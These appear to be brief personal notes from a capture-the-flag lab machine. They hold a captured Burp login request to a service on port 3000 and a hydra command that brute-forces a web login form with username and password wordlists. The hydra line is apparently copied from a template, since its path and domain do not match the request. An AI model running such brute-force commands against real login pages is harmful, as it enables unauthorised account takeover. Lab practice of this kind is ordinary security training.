# ip 10.10.11.183

# header burp

POST /login HTTP/1.1
Host: 10.10.11.183:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.11.183:3000/login
content-type: application/json
Origin: http://10.10.11.183:3000
Content-Length: 49
Connection: close
Cookie: redirect_to=%2F
Sec-GPC: 1

{"user":"lsslslslslsll","password":"lslslslslsl"}

# hacktrick hydra grafana test

hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V